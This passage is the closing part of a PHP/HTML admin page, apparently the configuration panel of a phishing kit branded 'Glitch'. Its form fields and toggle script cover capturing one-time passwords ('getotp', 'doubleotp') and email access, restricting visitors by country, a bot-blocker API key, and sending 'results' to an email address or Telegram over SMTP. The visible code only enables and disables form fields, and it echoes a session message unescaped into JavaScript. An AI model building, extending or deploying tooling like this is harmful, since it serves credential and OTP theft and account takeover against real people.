                                                            <label class="form-check-label" for="send-mail">Use Internal Sending</label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-12">
                                                <div class="text-end">
                                                    <button type="submit" class="btn btn-outline-primary" name="save">Save Configuration</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- End Container Fluid -->
            <!-- Footer Start -->
            <footer class="footer">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-12 text-center">
                            <script>document.write(new Date().getFullYear())</script> &copy; Glitch.</a>
                        </div>
                    </div>
                </div>
            </footer>
            <!-- Footer End -->
        </div>
        <!-- ==================================================== -->
        <!-- End Page Content -->
        <!-- ==================================================== -->
    </div>
    <!-- END Wrapper -->
    <!-- Vendor Javascript -->
    <script src="assets/js/vendor.min.js"></script>
    <!-- App Javascript -->
    <script src="assets/js/app.js"></script>
    <!-- Dashboard Js -->
    <script src="assets/js/pages/dashboard.js"></script>
    <!-- SweetAlert -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
    function updateDateTime() {
        const now = new Date();
        const formattedDateTime = now.toLocaleString('en-US', {
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric',
            timeZone: "Asia/Jakarta",
            hour12: true
        });
        document.getElementById('dateTime').textContent = formattedDateTime;
    }

    updateDateTime();
    setInterval(updateDateTime, 1000);
    document.addEventListener("DOMContentLoaded", () => {
        [
            ["getotp", "doubleotp"],
            ["getemailaccess", "doubleemailaccess"]
        ].forEach(([main, dbl]) => {
            const mainGlitch = document.querySelector(`[name="${main}"]`);
            const doubleGlitch = document.querySelector(`[name="${dbl}"]`);
            if (!mainGlitch || !doubleGlitch) return;
    
            const update = () => {
                doubleGlitch.disabled = !mainGlitch.checked;
                if (!mainGlitch.checked) doubleGlitch.checked = false;
            };
            update();
            mainGlitch.addEventListener("change", update);
        });
        
        const otp = document.getElementById("getotp");
        const otpDouble = document.getElementById("doubleotp");
        
        if (otp) {
            const syncOtp = () => {
                if (otp.checked) {
                    if (otpDouble) {
                        otpDouble.disabled = false;
                    }
                } else {
                    if (otpDouble) {
                        otpDouble.disabled = true;
                        otpDouble.checked = false;
                    }
                }
            };
        
            syncOtp();
        
            otp.addEventListener("change", syncOtp);
        }
        
        const toggleFields = (CheckBox, fields) =>
            fields.forEach(f => f.disabled = !CheckBox.checked);
        
        const lockCountryCheckBox = document.getElementById("lockcountry");
        const listCountryInput = document.getElementById("listcountry");
        if (lockCountryCheckBox && listCountryInput) {
            const updateLockCountry = () => {
                listCountryInput.disabled = !lockCountryCheckBox.checked;
            };
            updateLockCountry();
            lockCountryCheckBox.addEventListener("change", updateLockCountry);
        }
        
        const typeBlockerSelect = document.querySelector("select[name='typeblocker']");
        const apiKeyBlockerInput = document.querySelector("input[name='apikey_blocker']");
        
        if (typeBlockerSelect && apiKeyBlockerInput) {
            const updateTypeBlocker = () => {
                const val = typeBlockerSelect.value;
                apiKeyBlockerInput.disabled = (val === "none");
            };
        
            updateTypeBlocker();
            typeBlockerSelect.addEventListener("change", updateTypeBlocker);
        }
        
        const emailCheckBox = document.getElementById("resulttoemail");
        const telegramCheckBox = document.getElementById("resulttotelegram");
        const emailFields = document.querySelectorAll(".result-email-field");
        const telegramFields = document.querySelectorAll(".result-telegram-field");
    
        [emailCheckBox, telegramCheckBox].forEach((CheckBox, i) => {
            const fields = i === 0 ? emailFields : telegramFields;
            toggleFields(CheckBox, fields);
            CheckBox.addEventListener("change", () => toggleFields(CheckBox, fields));
        });
    
        const smtpFields = document.querySelectorAll(".smtp-field");
        const radios = document.querySelectorAll("input[name='sending']");
        const updateSMTP = () => {
            const disableSMTP = document.querySelector("input[name='sending']:checked")?.value === "mail";
            smtpFields.forEach(f => f.disabled = disableSMTP);
        };
        updateSMTP();
        radios.forEach(r => r.addEventListener("change", updateSMTP));
    });
    </script>
    <?php if (isset($_SESSION['message'])): ?>
    <script>
        Swal.fire({
            title: '<?= ($_SESSION['message_type'] ?? 'success') === "error" ? "Error!" : "Success!" ?>',
            text: '<?= $_SESSION['message']; ?>',
            icon: '<?= $_SESSION['message_type'] ?? 'success' ?>',
            confirmButtonColor: '#3085d6',
            background: '#1c1c1c',
            color: '#fff'
        });
    </script>
    <?php unset($_SESSION['message'], $_SESSION['message_type']); ?>
    <?php endif; ?>
</body>
</html>